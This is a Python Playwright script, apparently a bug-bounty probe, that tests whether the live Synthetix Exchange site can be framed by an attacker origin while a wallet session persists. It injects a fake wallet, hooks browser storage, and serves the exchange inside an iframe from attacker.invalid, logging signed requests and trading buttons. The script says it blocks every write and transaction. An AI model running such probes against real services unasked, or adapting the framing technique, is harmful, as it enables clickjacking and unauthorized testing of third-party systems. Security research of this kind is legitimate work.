#!/usr/bin/env python3
"""Synthetic session-persistence and cross-origin frame runtime probe for Synthetix Exchange.

The top-level setup uses a deterministic injected wallet whose signatures are dummy values accepted
only by locally fulfilled fake PAPI responses. It attempts the normal Connect Mobile Device flow so
the production frontend itself creates/persists a synthetic session. The same browser context then
loads Exchange inside a locally served attacker-origin iframe and records whether the session is read,
whether signed account requests are attempted, and which sensitive controls render. Every PAPI write,
private WebSocket, transaction RPC, and telemetry submission is intercepted before transmission.
No real account, signature, balance, order, credential, or protocol state is touched.
"""
from __future__ import annotations
import asyncio,hashlib,json,pathlib,re,urllib.parse
from typing import Any
from playwright.async_api import Browser,Page,Request,Route,async_playwright
OUT=pathlib.Path('synthetix_session_frame_runtime');OUT.mkdir(parents=True,exist_ok=True)
EXCHANGE='https://exchange.synthetix.io/?market=BTC-USDT';ATTACKER='https://attacker.invalid/'
OWNER='0x1563915e194D8CfBA1943570603F7606A3115508';ACCOUNT='2000000000000000000';DUMMY_SIG='0x'+'11'*65
TELEMETRY=('sentry.io','segment.io','segment.com','posthog.com','intercom.io')
def sha(v):return hashlib.sha256(v if isinstance(v,bytes) else v.encode()).hexdigest()
INIT=f"""
(() => {{
 const state={{providerCalls:[],storageGets:[],storageSets:[],errors:[]}};Object.defineProperty(window,'__zdbSF',{{value:state}});
 try{{const gp=Storage.prototype.getItem;Storage.prototype.getItem=function(k){{const v=gp.call(this,k);state.storageGets.push({{key:String(k),valueBytes:v?String(v).length:0,valueSha:v?null:null}});return v}};const sp=Storage.prototype.setItem;Storage.prototype.setItem=function(k,v){{state.storageSets.push({{key:String(k),valueBytes:String(v).length,containsPrivateKey:/privateKey/i.test(String(v)),containsSession:/session/i.test(String(v))}});return sp.call(this,k,v)}}}}catch(e){{state.errors.push(String(e))}}
 const ls=new Map();const provider={{selectedAddress:'{OWNER}',chainId:'0x1',networkVersion:'1',isConnected:()=>true,request:async(a)=>{{const m=a&&a.method||'';state.providerCalls.push({{method:m,paramsType:Array.isArray(a&&a.params)?'array':typeof(a&&a.params}});if(m==='eth_requestAccounts'||m==='eth_accounts')return [provider.selectedAddress];if(m==='eth_chainId')return '0x1';if(m==='net_version')return '1';if(m==='wallet_switchEthereumChain'||m==='wallet_addEthereumChain')return null;if(m==='wallet_getPermissions'||m==='wallet_requestPermissions')return [{{parentCapability:'eth_accounts'}}];if(m==='eth_getBalance'||m==='eth_getTransactionCount'||m==='eth_blockNumber')return '0x0';if(m==='eth_estimateGas')return '0x5208';if(m==='eth_gasPrice')return '0x0';if(m==='eth_call')return '0x';if(m.toLowerCase().includes('signtypeddata')||m.toLowerCase().includes('signmessage')||m==='personal_sign')return '{DUMMY_SIG}';if(m.toLowerCase().includes('sendtransaction'))throw new Error('Synthetic provider blocks transactions');return null}},on:(e,c)=>{{const s=ls.get(e)||new Set();s.add(c);ls.set(e,s);return provider}},removeListener:(e,c)=>{{const s=ls.get(e);if(s)s.delete(c);return provider}}}};
 const detail={{info:{{uuid:'0a6ddfe2-f22f-4b74-bd73-2123ea7cdd8c',name:'Audit Injected Wallet',icon:'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>',rdns:'io.zerodaybugs.audit'}},provider}};const announce=()=>window.dispatchEvent(new CustomEvent('eip6963:announceProvider',{{detail}}));window.addEventListener('eip6963:requestProvider',announce);Object.defineProperty(window,'ethereum',{{value:provider,configurable:true}});queueMicrotask(announce);setTimeout(announce,50);setTimeout(announce,500);
}})();
"""
async def click(page:Page,patterns:list[str]):
 bs=page.locator('button')
 for pat in patterns:
  rx=re.compile(pat,re.I)
  for i in range(min(await bs.count(),500)):
   b=bs.nth(i)
   try:
    if not await b.is_visible() or await b.is_disabled():continue
    t=((await b.inner_text()) or '').strip();a=(await b.get_attribute('aria-label')) or ''
    if rx.search(t+' '+a):await b.click(timeout=4000);return {'clicked':True,'text':t[:200],'aria':a[:200]}
   except Exception:continue
 return {'clicked':False,'patterns':patterns}
def fake_response(action:str|None):
 if action=='getSubAccountIds':return {'status':'ok','response':{'subAccountIds':[ACCOUNT],'managedSubAccountIds':[],'delegatedSubAccountIds':[]}}
 if action in {'getDelegatedSigners','getPositions','getOpenOrders','getOrderHistory','getTrades','getBalanceUpdates','getFundingPayments','getTransfers'}:return {'status':'ok','response':[]}
 if action=='getSubAccount':return {'status':'ok','response':{'id':ACCOUNT,'subAccountId':ACCOUNT,'name':'Synthetic Audit Account','walletAddress':OWNER,'owner':OWNER,'totalValue':'1000','availableMargin':'1000','withdrawableAmount':'1000','balances':[{'symbol':'USDT','balance':'1000'}]}}
 if action in {'getFeeRate','getRateLimits'}:return {'status':'ok','response':{}}
 if action=='addDelegatedSigner':return {'status':'ok','response':{'success':True}}
 return {'status':'ok','response':{}}
async def run(browser:Browser):
 context=await browser.new_context(viewport={'width':1365,'height':900});await context.add_init_script(INIT);page=await context.new_page();reqs=[];writes=[]
 async def handler(route:Route,request:Request):
  u=urllib.parse.urlparse(request.url);host=(u.hostname or '').lower();method=request.method.upper()
  try:body=request.post_data or ''
  except Exception:body=''
  if host=='attacker.invalid':
   await route.fulfill(status=200,content_type='text/html',body=f'<!doctype html><style>html,body{{margin:0}}iframe{{width:1280px;height:800px;border:0}}</style><iframe id=t src="{EXCHANGE}"></iframe>');return
  if host=='papi.synthetix.io' and u.path.startswith('/v1/') and method=='POST':
   try:d=json.loads(body);action=(d.get('params') or {}).get('action')
   except Exception:action=None
   meta={'phase':'frame' if page.url.startswith(ATTACKER) else 'setup','path':u.path,'action':action,'hasSignature':'signature' in body,'bodySha256':sha(body),'bodyBytes':len(body)};reqs.append(meta)
   if u.path.rstrip('/').endswith('/trade') and action and not str(action).startswith('get'):writes.append(meta)
   await route.fulfill(status=200,content_type='application/json',body=json.dumps(fake_response(action)));return
  tx=any(x in body for x in ('eth_sendTransaction','eth_sendRawTransaction'));pws=request.url.startswith('wss://papi.synthetix.io/v1/ws/trade');tele=any(x in host for x in TELEMETRY) and method!='GET';third=host not in {'exchange.synthetix.io','attacker.invalid','papi.synthetix.io',''} and method!='GET';blocked=tx or pws or tele or third
  if blocked:await route.abort('blockedbyclient')
  else:await route.continue_()
 await page.route('**/*',handler)
 stages={}
 try:await page.goto(EXCHANGE,wait_until='domcontentloaded',timeout=60000);await page.wait_for_timeout(9000)
 except Exception as e:stages['setupNavigationError']=f'{type(e).__name__}: {e}'[:500]
 stages['connect']=await click(page,[r'^connect wallet$',r'connect']);await page.wait_for_timeout(2500)
 stages['wallet']=await click(page,[r'audit injected wallet',r'audit',r'injected',r'browser wallet']);await page.wait_for_timeout(9000)
 stages['accountMenu']=await click(page,[r'account',r'wallet',r'profile',r'settings']);await page.wait_for_timeout(2500)
 stages['mobile']=await click(page,[r'connect mobile',r'mobile device']);await page.wait_for_timeout(12000)
 setup_state=await page.evaluate("""() => {const s=window.__zdbSF||{};const vals={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);const v=localStorage.getItem(k)||'';vals[k]={bytes:v.length,containsPrivateKey:/privateKey/i.test(v),containsSession:/session/i.test(v),sha256:null}}return {...s,localStorage:vals}}""")
 try:await page.goto(ATTACKER,wait_until='domcontentloaded',timeout=60000);await page.wait_for_timeout(12000)
 except Exception as e:stages['frameNavigationError']=f'{type(e).__name__}: {e}'[:500]
 frames=[]
 for f in page.frames:
  item={'url':f.url}
  try:
   item['text']=((await f.locator('body').inner_text(timeout=3000)) or '')[:10000]
   item['buttons']=[x[:200] for x in await f.locator('button').all_inner_texts()][:300]
   item['runtime']=await f.evaluate("() => window.__zdbSF || null")
  except Exception as e:item['error']=f'{type(e).__name__}: {e}'[:300]
  frames.append(item)
 frame_reqs=[r for r in reqs if r['phase']=='frame'];frame_signed=[r for r in frame_reqs if r['hasSignature']];sensitive_buttons=[]
 for fr in frames:
  for t in fr.get('buttons',[]):
   if re.search(r'buy|sell|long|short|close|cancel|withdraw|transfer|delegate|leverage',t,re.I):sensitive_buttons.append(t)
 result={'safety':'All PAPI responses fulfilled locally; no real signature/account/write/network state.','stages':stages,'setupStorage':setup_state,'frameCount':len(frames),'targetFrameCount':sum(1 for f in frames if f['url'].startswith('https://exchange.synthetix.io')),'frameSignedRequestCount':len(frame_signed),'frameSignedActions':[r['action'] for r in frame_signed],'sensitiveButtonCount':len(sensitive_buttons),'sensitiveButtons':sensitive_buttons[:200],'requests':reqs[:500],'writeAttemptsIntercepted':writes[:100],'frames':frames,'verdict':'SESSION_ACTIVE_IN_CROSS_ORIGIN_FRAME' if frame_signed else ('FRAMEABLE_WITH_SENSITIVE_CONTROLS' if sensitive_buttons else 'NO_SESSION_FRAME_CHAIN_PROVEN')}
 (OUT/'summary.json').write_text(json.dumps(result,indent=2,sort_keys=True),encoding='utf-8');await page.screenshot(path=str(OUT/'attacker_frame.png'),full_page=True)
 print(json.dumps({k:result[k] for k in ('targetFrameCount','frameSignedRequestCount','sensitiveButtonCount','verdict')},indent=2));await context.close()
async def main():
 async with async_playwright() as p:
  b=await p.chromium.launch(headless=True)
  try:await run(b)
  finally:await b.close()
if __name__=='__main__':asyncio.run(main())
